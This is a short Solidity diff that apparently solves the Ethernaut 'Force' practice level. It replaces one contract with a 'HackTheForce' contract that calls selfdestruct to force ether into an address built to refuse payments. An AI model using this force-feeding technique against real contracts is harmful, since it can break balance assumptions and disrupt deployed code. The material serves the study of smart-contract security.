@@ -11,14 +11,9 @@ contract Force {/*
 
 */}
 
-contract ForceBalance {
-    address payable public to;
+contract HackTheForce {
 
-    constructor(address _to) {
-        to = payable(_to);
-    }
-
-    receive() external payable {
-        selfdestruct(to);
+    function hack(address _address) public payable {
+        selfdestruct(payable(_address));
     }
 }
